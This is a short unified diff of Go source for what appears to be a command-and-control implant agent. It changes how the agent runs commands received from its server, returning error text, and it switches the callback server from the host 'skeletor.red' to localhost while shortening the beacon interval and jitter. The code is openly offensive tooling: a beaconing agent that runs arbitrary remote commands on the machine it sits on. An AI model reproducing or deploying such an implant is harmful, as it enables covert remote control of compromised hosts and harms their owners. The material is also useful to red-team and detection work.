@@ -104,11 +104,10 @@ func (agent *Agent) HandleTask(task Task) (Result, error) {
 
 	switch task.Action {
 	case "command":
-		cmd := execCommand(task.Input)
-		out, err := cmd.CombinedOutput()
+		out, err := execCommand(task.Input)
 		// out,err := execCommand(task.Input) #rewrote to only get output as string, no longer need return code
 		if err != nil {
-			result.Result = string(bytes.ToValidUTF8(out, []byte("?")))
+			result.Result = string(bytes.ToValidUTF8([]byte(err.Error()), []byte("?")))
 		} else {
 			result.Result = string(out)
 		}
@@ -141,10 +140,10 @@ func (agent *Agent) Sleep() {
 func main() {
 	agent := Agent{
 		LocalIP:          getLocalIP(),
-		ServerIP:         "skeletor.red",
+		ServerIP:         "127.0.0.1",
 		ServerPort:       80,
-		CallbackInterval: 120,
-		Jitter:           15,
+		CallbackInterval: 15,
+		Jitter:           5,
 		Debug:            false,
 		Client: &http.Client{
 			Timeout: 10 * time.Second,
